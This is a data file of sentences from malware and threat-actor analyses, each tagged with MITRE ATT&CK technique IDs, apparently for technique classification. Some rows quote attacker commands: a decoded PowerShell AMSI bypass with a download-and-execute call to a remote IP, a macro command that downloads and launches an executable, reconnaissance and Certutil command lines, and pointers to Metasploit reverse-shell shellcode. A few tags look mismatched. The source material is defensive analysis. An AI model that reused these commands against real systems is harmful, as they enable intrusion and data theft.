Specifies the screen coordinates to take   -zip Name of password (from configuration data) protected zip archive   -clipboard Screenshot file name where a bitmap from the clipboard is saved in Cache005 subdirectory, zipped with password from configuration    Data exfiltration Exfiltration is done through the bitsadmin.exe utility	['T1113', 'T1115', 'T1560', 'T1132', 'T1486']
SpyNote RAT is capable of performing a variety of alarming functions that includes:   Activating the device’s microphone and listening to live conversations  Executing commands on the device  Copying files from the device to a Command & Control (C&C) center  Recording screen captures  Viewing contacts  Reading SMS messages  The screenshot below shows part of the sandbox’s report on the SpyNote RAT’s signature and detected functions:          Figure 1 : Zscaler Cloud Sandbox Detection     The fake Netflix app we are analyzing in this blog appears to be built using an updated version of SpyNote RAT builder, which was leaked last year	['T1113', 'T1083', 'T1043']
Strings in the backdoor are encrypted using a custom algorithm that uses XOR with a 4-byte key	['T1573', 'T1027']
Summary information for the three binaries we analyzed follows:    MD5 364ff454dcf00420cff13a57bcb78467   SHA-256 8bca0031f3b691421cb15f9c6e71ce19335 5d2d8cf2b190438b6962761d0c6bb   ssdeep 3072:n+1R4tREtGN4qyGCXdHPYK9l0H786 O26BmMAwyWMn/qwwiHNl:n+1R43QcIL XdF0w6IBmMAwwCwwi   Size 141.2 KB (144560 bytes)   Type ELF 64-bit (stripped)   Install as root /bin/rsyncd   Root install desc synchronize and backup service   Install as non-root ~/.config/dbus-notifier/dbus-inotifier   Non-root install desc system service d-bus notifier   C2 azureon-line[.]com (TCP/80)   Usage Timeframe Late 2014    Table 1: Sample 1 – Late 2014 Sofacy 64-bit Fysbis    MD5 075b6695ab63f36af65f7ffd45cccd39   SHA-256 02c7cf55fd5c5809ce2dce56085ba43795f2 480423a4256537bfdfda0df85592   ssdeep 3072:9ZAxHANuat3WWFY9nqjwbuZf454U NqRpROIDLHaSeWb3LGmPTrIW33HxIajF: 9ZAxHANJAvbuZf454UN+rv eQLZPTrV3Z   Size 175.9 KB (180148 bytes)   Type ELF 32-bit (stripped)   Install as root /bin/ksysdefd   Root install desc system kernel service defender   Install as non-root ~/.config/ksysdef/ksysdefd   Non-root install desc system kernel service defender   C2 198.105.125[.]74 (TCP/80)   Usage Timeframe Early 2015    Table 2: Sample 2 – Early 2015 Sofacy 32-bit Fysbis    MD5 e107c5c84ded6cd9391aede7f04d64c8   SHA-256 fd8b2ea9a2e8a67e4cb3904b49c789d57ed 9b1ce5bebfe54fe3d98214d6a0f61   ssdeep 6144:W/D5tpLWtr91gmaVy+mdckn6BCUd c4mLc2B9:4D5Lqgkcj+   Size 314.4 KB (321902 bytes)   Type ELF 64-bit (not stripped)   Install as root /bin/ksysdefd   Root install desc system kernel service defender   Install as non-root ~/.config/ksysdef/ksysdefd   Non-root install desc system kernel service defender   C2 mozilla-plugins[.]com (TCP/80)   Usage Timeframe Late 2015    Table 3: Sample 3 – Late 2015 Sofacy 64-bit Fysbis Overall, these binaries are assessed as low sophistication, but effective	['T1082', 'T1543.003', 'T1569.002']
System info:  Computer name System info using: cmd /c systeminfo >%temp%\temp.ini List of currently running process using: cmd /c tasklist >%temp%\temp.ini    Exfiltration  The data exfiltration process runs in the following sequence: The temp.ini files are copied into a text file that matches the pattern:  From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt	['T1082', 'T1074', 'T1057', 'T1486']
"Team member or team identifier Analysis of the OwaAuth web shell revealed a PDB string with the ""SyberSpace"" username (see Figure 20)"	['T1033', 'T1505.003']
Techniques for Analysis When I was analyzing this sample, the malware was unable to connect to its C2.  However, I was still able to analyze the network traffic of the sample.  How, you might ask?  Using a hex editor and a script I wrote to encrypt text using the algorithm that this sample uses, I encrypted my own C2 address (192.168.1.108:7721) and replaced the hardcoded C2 address with my own encrypted address.  I then opened a listener on my own IP on the respective port.    [Screenshot 3] comparison of My IP (Left) vs C2 IP (Right) Next, using a debugger, I set a couple breakpoints in the Internet Communications function and ran the malware.  The malware sample then connected to my IP and sent information to me, which I was able to observe using Wireshark.  After I’d captured the traffic, I was able to write another script to decrypt and decompress the traffic in order to view the data being sent.  Additionally, I then wrote a socket script that detects the Gh0stRAT variant traffic, automatically decrypts the traffic, and then extracts the Implant_Opcodes for the sample.  A second version of the script allows commands to be sent back to the malware, after I enumerated the exact command format for the sample.   [Screenshot 4] Output of Version 1 of the script So far, the 2 opcodes that the sample has sent are 0x65 and 0x66, or Implant_Heartbeat and Implant_Login, respectively.  “Hitting between the heartbeats” When sending commands, first the sample must login in with 0x65, then you can send commands to it.  However, you have to move fast as the sample will send an Implant_Heartbeat followed by an Implant_Login every 10 seconds or so, and if you try to send a command to the sample as it is responding with either opcode, it will ignore the command.  A proof of concept of the command script can be found here , while the Implant extraction script and the Command Script will be included in the Appendix	['T1573', 'T1132']
TG-3390 actors favor At.exe to create scheduled tasks for executing commands on remote systems	['T1053.005', 'T1059']
"TG-3390 actors frequently change the C2 domain's A record to point to the loopback IP address 127.0.0.1, which is a variation of a technique known as ""parking."" Other variations of parking point the IP address to Google's recursive name server 8.8.8.8, an address belonging to Confluence, or to other non-routable addresses"	['T1573', 'T1016']
TG-3390 actors keep track of and leverage existing ASPXTool web shells in their operations, preferring to issue commands via an internally accessible web shell rather than HttpBrowser or PlugX	['T1059', 'T1505.003']
The agent control panel has three tabs that have interfaces that allow the actor to issue commands, as well as upload and download files to and from the agent	['T1543.001', 'T1105']
The assembly code used to create the shellcode can be obtained from: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_http.asm The purpose of the shellcode is to obtain additional shellcode to execute using an HTTP request to the URL “hxxp://45.76.128[.]165:4443/0w0O6”	['T1071', 'T1064']
The backdoors they are deploying are difficult to detect and a significant threat to the privacy and security of enterprises, allowing attackers to steal information, delete files, install malware, and more	['T1518.001', 'T1070.004']
The C2 communications begins with a beacon to the following URL: hxxp://www.windowspatch[.]com/khc?<hex(STDOUT of whoami command)> If the C2 server wishes to send a command, it will respond to the beacon above by echoing the whoami command results sent by the Trojan to the C2 in the URL	['T1033', 'T1571', 'T1008', 'T1043']
The code obtains the external IP address via an HTTP request using to “http://checkip.dyndns.org/” and uses a regular expression to locate an IP address from the HTTP response	['T1071', 'T1016']
The code then decodes this set of import symbols and resolves addresses for its networking and data stealing functionality: InternetCloseHandle InternetReadFile HttpSendRequestA HttpOpenRequestA HttpQueryInfoA InternetConnectA InternetCrackUrlA InternetOpenA InternetSetOptionW GetAdaptersInfo Much like the prior office monkey “atiumdag.dll” component, this code collects identifying system information using standard win32 API calls: Computer name – GetComputerNameW User name – GetUserNameW Adapter GUID, ip address, mac address – GetAdaptersInfo Windows version – GetVersionExW It then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls	['T1106', 'T1140', 'T1016']
The command handler obtains a command identifier from the C2 server and adds 0xFFFFFF9B to this value and then uses a switch statement to determine the appropriate command to execute	['T1016', 'T1059']
The configuration data used by the backdoor has the following structure: #pragma pack(push, 1) struct st_cncconfig {   _WORD id;   _BYTE byte2;   _BYTE byte3;   _QWORD pCnCBeg;   _QWORD pCnCEnd;   _QWORD pLastElement; }; #pragma pack(pop) To be able to enter the data into the database, Linux.BackDoor.Fysbis.1 converts the configuration data into the following structure: #pragma pack(push, 1) struct st_crypted_config_data {   _WORD id;   _BYTE byte2;   _BYTE byte3;   char* pCnC;  }; #pragma pack(pop) Before the configuration data is encrypted with the RC4 algorithm, 11 signature bytes are added to the end of the data (11 bytes are stored in the backdoor's body)	['T1005', 'T1140', 'T1027.002', 'T1041', 'T1560', 'T1486']
The contents of the batch files vary depending on the OS (x64 vs x86). The batch files perform these tasks:  Stop the service COMSysApp Configure the service to autostart (to set up persistence on the system) Modify registry keys to launch the DLL unser svchost.exe Specify the malicious DLL path to be loaded into the svchost process	['T1055', 'T1112', 'T1064', 'T1569.002']
The data dump included the 0000000000.bat file, which when executed on an infected system would run the following commands to gather information to be sent back to the C2 server:  whoami hostname ipconfig /all net user /domain net group /domain net group “domain admins” /domain net group “Exchange Trusted Subsystem” /domain net accounts /domain net user net localgroup administrators netstat -an tasklist systeminfo reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default” schtasks /query /FO List /TN “GoogleUpdatesTaskMachineUI” /V | findstr /b /n /c:”Repeat: Every:” WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List  This batch script is also interesting as it uses echo commands to include headers before each of the command results	['T1069', 'T1087']
The data field within the message is a string of custom base64 encoded data that the malware decodes using the same custom base64 routine mentioned earlier and decrypts it using AES and the pre-shared key	['T1573', 'T1140', 'T1132']
The downloaded .7zip file contains a .lnk file that, once pressed, initializes the malware	['T1547.009', 'T1105']
The dropper installs the backdoor, sets its attributes to “hidden”, and sets a random file date and time When the dropper installs the backdoor, it sets its attributes to “hidden” and sets file date and time to  random values using the touch command: touch –t YYMMDDMM “/path/filename” > /dev/null	['T1070.006', 'T1564.001', 'T1124']
The encrypted message is then Base64 encoded, replacing all the ‘/’ and ‘+’ characters with the ‘.’ and ‘-’ characters, respectively	['T1027', 'T1132']
The executable will drop the packaged QUADAGENT PowerShell script using the filename Office365DCOMCheck.ps1 in addition to a VBScript file with the same filename which will assist in the execution of it	['T1036', 'T1064']
"The file is saved to: C:\Users\[Username]\AppData\Local\Temp\notepad.exe  00 00 04  Content after command ID is written to: C:\Users\[Username]\AppData\Local\Temp\notepad2.exe  00 00 05  The files notepad1.exe and notepad2.exe are concatenated together and written to C:\Users\[Username]\AppData\Local\Temp\newnotepad.exe and executed  00 00 06  The contents of the following file is sent to the server: C:\Users\[Username]\AppData\Local\Temp\note.txt  00 00 07  The string following the command ID is executed using ""cmd /C"" and results are sent to server   Links to APT3 On October 28, we observed APT3 sending out spearphishing messages containing a compressed executable attachment"	['T1033', 'T1036', 'T1087', 'T1204']
The first email displays the following decoy document to the infected user and download the following payload:hxxp://discgolfglow[.]com:/wp-content/plugins/maintenance/images/worker.jpgThe second email displays the following decoy document to the infected user and downloads the following payload:hxxp://acddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpgIn both cases, the downloaded payload is the ROKRAT malware.The first tasks of this variant of ROKRAT is to check the operating system version	['T1105', 'T1497']
The first stage shellcode contains an interesting NOP sled with alternative instructions, which was most likely designed in such a way to avoid detection by antivirus products looking for large NOP blocks inside flash files: NOP sled composed of 0x90 and 0x91 opcodes The main purpose of the initial shellcode is to download second stage shellcode from hxxp://89.45.67[.]107/rss/5uzosoff0u.iaf	['T1064', 'T1027', 'T1105']
The following commands are available:    Command  SubCommand Description   VER  Generates the following IRC client command that will be sent to the C2 server:   PRIVMSG <username> :    8 LED= 20160124   KILL  Trojan disconnects from the IRC server and terminates itself   RESET  Trojan disconnects from the IRC server and runs the executable again   OS  Obtains the Windows version and responds to the C2 with the following message “PRIVMSG <username> :<one of the following version strings>”:   Windows NT Windows 95 Windows 98 Windows ME Windows 2003 Windows XP Windows 7 Windows Vista Unkown os info   !SH EXEC Not supported    MD Creates a specified directory	['T1106', 'T1010']
The following commands are supported by the malware:  Command ID  Description  00 00 00  Content after command ID is written to: C:\Users\[Username]\AppData\Local\Temp\notepad1.exe  00 00 01  Deletes the files: C:\Users\[Username]\AppData\Local\Temp\notepad.exe C:\Users\[Username]\AppData\Local\Temp\newnotepad.exe  00 00 02  Malware exits  00 00 03  Malware downloads the URL that follows the command ID	['T1033', 'T1204']
The following functions are called when the application attempts to initialize the menu:ETransaksi.Speed(); // Legitimate class, but method is the first  wrapped function that leads to malicious code ProjectData.EndApp(); // Closes the application before rest of  legitimate Sales System Application functions are calledThe “Speed” method in the legitimate ETransaksi class contains legitimate code from the Sales System Application; however, the author of this tool includes this code in an if/else construct that bypasses these instructions by setting a false flag to skip the legitimate code and execute the next step to the malicious code	['T1140', 'T1036', 'T1027.001', 'T1189']
The following graph view from IDA shows these steps.These execution steps allow the launch of the new ROKRAT variant by decoding the PE binary and injecting into the cmd.exe process	['T1055', 'T1059']
The following HTTP request from the Helminth backdoor (SHA256: 1fb69090be8a2e11eeb220b26ee5eddf1e3fe81ffa59c47d47d01bf90c2b080c) downloaded the similar batch script: GET /update-index.aspx?req=1786873725%5Cbat&m=d HTTP/1.1 Host: update-kernal[.]net Connection: Keep-Alive We performed a code comparison to visualize the similarities between the batch script delivered as the default command in Poison Frog is to the script provided to the Helminth backdoor	['T1071', 'T1064']
The following screenshot shows the command execution functionality in action:            Figure 4: Command Execution     The paramString parameter shown in the above screenshot can be any command received from C&C	['T1113', 'T1059']
The frequent checking ensures that any changes made will be quickly followed, and the repeated attempts to run the Revenge RAT binary make it almost certain that even if the process is terminated, the RAT will be running again soon	['T1057', 'T1043']
The function builds the contents of a second file by concatenating several strings together, but this second file is a .sct file that the function will write to a file %TEMP%\12-B-366.txt	['T1070.006', 'T1140']
The function will take another executable embedded in the initial Trojan as a resource named “M”, which it attempts to inject into the following process to execute: C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe While it’s configured to inject into cvtres.exe, the Trojan is also capable of injecting its code into the following process as well: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe   Embedded injector Trojan The R payload discussed above is nothing more than an injector Trojan, which accepts a path to an executable and a buffer of code to inject into the process as arguments	['T1055.012', 'T1055']
The infection process is rather interesting, as it involves multiple layers of .NET assemblies that will eventually download the NanoCore remote administration tool (RAT) from a remote server and inject it into another process	['T1055', 'T1105']
The information gathered is added to a string in the following structure: <IP address>|<computer name>|<domain>|<username>|<isAdmin flag>|<hasGarbage flag from config>|<hasStartup flag from config>|<“hybrid” mode flag from config>|<sleep interval from config>|<jitter value from config> The payload will base64 encode this string and use its DNS tunneling protocol to transmit the data to the C2	['T1033', 'T1016']
The last query is to the subdomain ihc[.]stage[.]12019683[.]ns2[.]true-deals[.]com):   The delivered second stage shellcode is encrypted:  METERPRETER: After decryption of the second stage shellcode, the shellcode deletes the ‘MZ’ prefix from within a very important part of the shellcode	['T1064', 'T1027']
The latter PowerShell injects a shellcode into its own process using well-known CreateThread and VirtualAlloc techniques:   SHELLCODE: The shellcode phase of this attack is unique and demonstrates the constantly advancing abilities of attackers	['T1064', 'T1059.001']
The loader’s main goal was to run a PowerShell command to execute shellcode	['T1059', 'T1059.001']
The lures are primarily documents of interest to Pakistani nuclear organizations and the Pakistani military as can be seen in the images below:  Figure 1 Lure extracted from a67220bcf289af6a99a9760c05d197d09502c2119f62762f78523aa7cbc96ef1  Figure 2 Lure extracted from 07d5509988b1aa6f8d5203bc4b75e6d7be6acf5055831cc961a51d3e921f96bd  Figure 3 Lure extracted from b8abf94017b159f8c1f0746dca24b4eeaf7e27d2ffa83ca053a87deb7560a571  Figure 4 Lure extracted from d486ed118a425d902044fb7a84267e92b49169c24051ee9de41327ee5e6ac7c2 and fd8394b2ff9cd00380dc2b5a870e15183f1dc3bd82ca6ee58f055b44074c7fd4   The payload from each of the malicious documents is an updated version of the BADNEWS malware family	['T1204', 'T1560']
The macro downloads a payload from hxxp://lokipanelhostingpanel[.]gq/work/kh/1.exe (SHA256: 84ed59953f57f5927b9843f35ca3c325155d5210824d3b79b060755827b51f72) by running the following command line process:cmd.exe /c powershell -W Hidden (New-Object System.NeT.WeBClieNT).DownloadFile('http://lokipanelhostingpanel[.]gq/work/kh/1.exe','%Public%\\\\svchost32.exe');Start-Process '%Public%\\\\svchost32.exeThe macro then attempts to kill Microsoft Office and Windows Defender processes using the ‘taskkill’ command	['T1055.012', 'T1057']
The macro saves the chkSrv.vbs script to the system, which is responsible for running the IntelSecurityAssistManager.exe payload (OopsIE Trojan) and cleaning up the installation by deleting the two scheduled tasks, the Base.txt file, the ThreeDollars document, and the chkSrv.vbs script	['T1053.005', 'T1070.004']
The main function of the dropper All strings within the dropper, as well as the backdoor, are encrypted using a hardcoded RSA256 key	['T1140', 'T1027']
The malicious DLL is also responsible for terminating the cliconfg.exe process and deleting the malicious NTWDBLIB.dll using: cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL All the following capabilities described are implemented by the malicious service DLL implant unless specified.   Variant using North Korean Red Cross Another variant (hash: 9e2c0bd19a77d712055ccc0276fdc062e9351436) of the malicious Word dropper uses the same Base64-decoding scheme with a different custom key	['T1055', 'T1574.002']
The malware beacons to this directory using the hardcoded API token and attempts to download these files (which are deleted from the Dropbox account after the download):  upload.bat, a batch script that the compromised machine will execute upload.rar, a RAR archive that contains at least two files: a batch script to execute, and often an executable (sometimes named rar.exe)  which the batch script will run and almost always uploads the results of download.rar to the cloud storage account silent.txt and period.txt,  small files sizes of 0-4 bytes that dictate the frequency to check in with the CnC  The threat actor will then download the results and then delete the files from the cloud storage account	['T1064', 'T1105']
The malware demonstrates its evasive behavior by checking for the presence of specific processes related to antimalware products:  The presence of any process with the keywords “v3” and “cleaner.”   Checking for antimalware or cleaner processes	['T1562.001', 'T1057']
The malware uses obfuscation in order to hide strings such as URL or User-Agent, the algorithm is based on bitwise (SUB 0x0F XOR 0x21), here is the decoded data:hxxp://old[.]jrchina[.]com/btob_asiana/udel_confirm.phpMozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; .NET4.0E; InfoPath.3)The downloaded third payload is obfuscated using the same technique	['T1087', 'T1027']
The malware utilizes several persistence mechanisms including scheduled tasks, Userinit and Run registry keys in the HKLM hive	['T1053.005', 'T1547.001']
The OopsIE Trojan is configured to use a C2 server hosted at:www.msoffice365cdn[.]com The Trojan will construct specific URLs to communicate with the C2 server and parses the C2 server’s response looking for content within the tags <pre> and </pre>	['T1071', 'T1573', 'T1102', 'T1041', 'T1008']
The paths discovered are:  • C:\Users\leo\AppData\Local\Temp\Word8.0\MSForms.exd • C:\Users\poopak\AppData\Local\Temp\Word8.0\MSForms.exd • C:\Users\Vendetta\AppData\Local\Temp\Word8.0\MSForms.exd • C:\Users\Turk\AppData\Local\Temp\Word8.0\MSForms.exd   Leo, Poopak, Vendetta and Turk are the usernames of those creating the documents or the templates on which they are based	['T1033', 'T1005', 'T1087', 'T1204']
The payload has a function it calls early on that tests to see which DNS query types are able to successfully reach the C2 server.  It iterates through a list of types and the first DNS type to receive a response from the C2 server will be used for all communications between the payload and the C2 server, which are in the following order (editor’s note: AC is not a  DNS record type but is a mode where the trojan will perform a request for an A record requiring ac as a subdomain):  A AAAA AC – (see note above) CNAME MX TXT SRV SOA  The payload uses the built-in Windows nslookup application with specific parameters and specially crafted subdomains to communicate with the C2	['T1123', 'T1071', 'T1041', 'T1008']
The Payloads The delivery documents in this attack campaign loaded remote templates whose macros installed a variety of first-stage payloads	['T1064', 'T1027']
The payload then sets EIP to the entry point of the newly injected code using the SetThreadContext API, and finally calls the NtAlertResumeThread API function to run the injected code	['T1106', 'T1140']
The payload will communicate with its C2 server to obtain the session ID and pre-shared key and write it to this registry key in the following format:   <session id>_<pre-shared key>   To obtain the session ID and pre-shared key, the payload will first try to contact the C2 via an HTTPS GET request to the following URL:   hxxps://www.rdppath[.]com/   If the above request using HTTPS does not result in an HTTP 200 OK message or the response data has no alphanumeric characters, the code will attempt to communicate with the C2 server using HTTP via the following URL:   hxxp://www.rdppath[.]com/   The code to communicate with the C2 via HTTP exists within an exception handler	['T1071', 'T1008']
The payload will use a specific regular expressions dependent on the type of DNS query was used to obtain the command string, which can be seen in Table 2:    DNS TYPE Regex Pattern   A Address:\s+(\d+.\d+.\d+.\d+)   AC \d+-\d+-(\d+)-([\w\d+/=]+)-\d-.ac.$Global:domain   AAAA Address:\s+(([a-fA-F0-9]{0,4}:{1,4}[\w|:]+){1,8})   CNAME,MX,TXT,SRV,SOA (\d+)-([\w\d/=+]{0,})\-.$Global:domain    Table 2 Types of responses provided by C2 These regular expressions are used to build strings that the payload will then subject to its command handler	['T1071', 'T1016']
The plugin uses the same network protocol as PLAINTEE and so we were able to trivially decode further commands that were sent.  The following commands were observed:  tasklist ipconfig /all  The attacker performed these two commands 33 seconds apart	['T1573', 'T1059']
The PowerShell command decodes to the following:$command = 'WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACAAIAAgACAAdAByAHkAewAgAAoAIAAgACAAIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACAAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAAJAB0AHIAdQBlACkACgAgACAAIAAgAH0AYwBhAHQAYwBoAHsAfQAKACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADkALgA1ADkALgA0ADYALgAxADUANAA6ADMANAA4ADUALwBJAE0AbwA4AG8AbwBzAGkAZQBWAGEAaQAnACkAOwAKACAAIAAgACAA'         if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')          {                          $exec = $Env:windir + '\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command             IEX $exec         }         else         {             $exec = [System.Convert]::FromBase64String($command)             $exec = [Text.Encoding]::Unicode.GetString($exec)             IEX $exec         }The script above checks the system architecture to determine if it is an x64 machine and attempts to execute a base64 encoded command that decodes to the following:[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};     try{      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)     }catch{}     IEX (New-Object Net.WebClient).DownloadString('http:// 139.59.46[.]154:3485 /IMo8oosieVai');This decoded PowerShell script attempts to download and execute a file using HTTP from the URL “hxxp:// 139.59.46[.]154:3485 /IMo8oosieVai”	['T1059.001']
"The prior example decrypts to the following: mailto:121.126.211[.]94:8080;80;80   The following Python script may be used to decode the C2 data used by the newest Comnie variant:      12345678910111213141516171819202122232425262728293031323334353637383940  import base64import sysimport refrom string import maketransfrom struct import *import requestsdef rc4_crypt(data, key):  S = range(256)  j = 0  out = []  for i in range(256):    j = (j + S[i] + ord( key[i % len(key)] )) % 256    S[i] , S[j] = S[j] , S[i]  i = j = 0  for char in data:    i = ( i + 1 ) % 256    j = ( j + S[i] ) % 256    S[i] , S[j] = S[j] , S[i]    out.append(chr(ord(char) ^ S[(S[j] + S[i]) % 256]))  return ''.join(out)def decode(data):  o = """"  for d in data:    od = ord(d)    o += chr((4 * (16 * od | od & 0xC) | (((od >> 4 | od & 0x30) >> 2))) & 0xFF)  return obase64fixTable = maketrans(""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/""[::-1], ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"");def trans(string):  return str(string).translate(base64fixTable)def altdecode(string):  return base64.b64decode(trans(string))req = requests.get(sys.argv[1])fd = req.textoriginal_data = re.search(""magnet:/\?([^\?]+)\?"", fd).group(1)parsed_data = altdecode(original_data)dataLength = unpack(""<I"", parsed_data[64:68])[0]key = decode(parsed_data[0:64])data = parsed_data[dataLength*-1:]d = rc4_crypt(data, key)print(d)       Comnie will make attempts at connecting to the IP address above using the various ports specified"	['T1573', 'T1048', 'T1486']
The resulting Interop.SHDocVw .NET assembly is packed with SmartAssembly and further obfuscated using Confuser v1.9.0.0	['T1027.002', 'T1027']
The results of the decoded data may be seen below:    Figure 13 Decrypted information The decrypted data contains URLs for various online services that will be used by the attacker for downloading data that will contain the command and control (C2) server(s) and port(s) to be used by Comnie	['T1140', 'T1041', 'T1048']
The sample creates an array that contains the following strings for the Trojan to use as C2 locations: http://23.227.196[.]215/ http://apple-iclods[.]org/ http://apple-checker[.]org/ http://apple-uptoday[.]org/ http://apple-search[.]info Notice the last one is missing the trailing “/”, which causes an issue when the Trojan attempts to use this string to build the remainder of the C2 URL, as the Trojan will append the next string in the URL directly to this string	['T1071', 'T1008']
The screenshots included remote desktop (RDP) sessions showing the Glimpse panel, a web browser session displaying a C2 panel called Scarecrow, web browser sessions into VPS administrative panels, and evidence of potential destructive attacks against OilRig servers	['T1113', 'T1021.001', 'T1505.003']
The script will first attempt to communicate with the C2 server using HTTPS (HTTP if unsuccessful), which involves GET requests using the session ID within the request’s cookie in the PHPSESSID field, as seen in the example GET request:       GET / HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246Host: www.rdppath[.]comCookie: PHPSESSID=<c2 provided session id>Connection: Keep-Alive     If the payload is unable to reach the C2 via HTTPS/HTTP, the payload yet again falls back to DNS tunneling	['T1071', 'T1041', 'T1008']
The second named scheduled task, loaded as an XML file to falsify task attributes, ran a JavaScript code block that downloaded and launched a secondary backdoor, delivered as a multi-stage PowerShell script	['T1036', 'T1064']
The SecurityAssist task is responsible for running the following command line command that uses the Certutil application to decode the base64 encoded data in Base.txt and saves the decoded data to the file %PROGRAMDATA%\IntelSecurityAssistManager.exe:cmd.exe /c Certutil -decode %appdata%\Base.txt %programdata%\IntelSecurityAssistManager.exe & SchTasks /Delete /F /TN SecurityAssist The macro also creates a second scheduled task named Conhost that waits two minutes and runs a VBScript %APPDATA%\chkSrv.vbs	['T1140', 'T1036']
These dropped files bundle functionality for both 64bit and 32bit Windows systems and are all located within one directory: C:\Documents and Settings\user\Application Data\ATI_Subsystem\ 6761106f816313394a653db5172dc487,amdhcp32.dll,54kb  ← 32bit dll,CompiledOn:2014.07.02 21:13:24 d596827d48a3ff836545b3a999f2c3e3,aticaldd.dll,60kb  ← 64bit dll,CompiledOn:2014.07.02 21:13:26 bc626c8f11ed753f33ad1c0fe848d898,atiumdag.dll,285kb ← 32bit dll, Trojan.Win32.CozyDuke.a, CompiledOn:2014.07.02 21:13:26 4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat The code copies rundll32.exe from windows\system32 to its newly created %appdata%\ATI_Subsystem subdirectory as “amdocl_as32.exe” alongside the three dll’s listed above	['T1055', 'T1574.001', 'T1218.011', 'T1574.002']
The series of commands, as seen in Table 2, include checks for virtualized environments, low memory, and processor counts, in addition to checks for common analysis tools running on the system	['T1518.001', 'T1497']
The server-side component provides a simple graphical user interface for threat actors interacting with web shells	['T1059', 'T1505.003']
These vulnerabilities include:CVE-2015-6585: Hangul Word Processor VulnerabilityCVE-2015-8651: Adobe Flash Player 18.0.0.324 and 19.x VulnerabilityCVE-2016-0034: Microsoft Silverlight 5.1.41212.0 VulnerabilityCVE-2016-1019: Adobe Flash Player 21.0.0.197 VulnerabilityCVE-2016-4117: Adobe Flash Player 21.0.0.226 VulnerabilityDHS recommends that organizations upgrade these applications to the latest version and patch level	['T1068', 'T1203']
The SHA256 hash is then base64 encoded, which results in an encoded string of EfZrVfPSQwNiHl75VlsCpXbMWLxfh4nK6Ww9QABkuQ4=, of which the first 24 characters are used as the 3DES key	['T1027', 'T1132']
The shellcode executed by this PowerShell is the exact same as in the delivery documents, using code from Metasploit which can obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We were not able to retrieve the shellcode hosted at this URL	['T1071', 'T1064', 'T1059.001']
"The source code only considers the following machine types:default:   lpString = ""(Other)"";               break;case 0x02: lpString = ""(Unknown)"";             break;case 0x03: lpString = ""(Desktop)"";             break;case 0x04: lpString = ""(Low Profile Desktop)""; break;case 0x06: lpString = ""(Mini Tower)"";          break;case 0x07: lpString = ""(Tower)"";               break;case 0x08: lpString = ""(Portable)"";            break;case 0x09: lpString = ""(Laptop)"";              break;case 0x0A: lpString = ""(Notebook)"";            break;case 0x0E: lpString = ""(Sub Notebook)"";        break;The string format - with the () - and the considering types are exactly the same as those used in the ROKRAT samples.It's interesting to note that this reconnaissance phase was not included in the ROKRAT variant used during the ""Golden Time"" campaign.Brower StealerFor the first time, the ROKRAT sample used during the ""North Korean Human Rights"" contained a browser credentials stealer"	['T1008', 'T1124']
The started command will send the following information to the C&C:  device_model: the model identifier (e.g.: MacBookPro9,2) bot_version: version of Keydnap build_name: the “build name” that was given by downloader os_version: OS X or macOS kernel version ip_address: external IP address as reported by ipify.org has_root: 1 if executed as root, 0 otherwise  Backdoor commands The response to get_task contains an integer to identify the type of command and optional arguments	['T1082', 'T1016']
The string “fjzmpcjvqp” is unique and not something likely to be present if the code was not generated with the same public POC exploit code	['T1140', 'T1027.001']
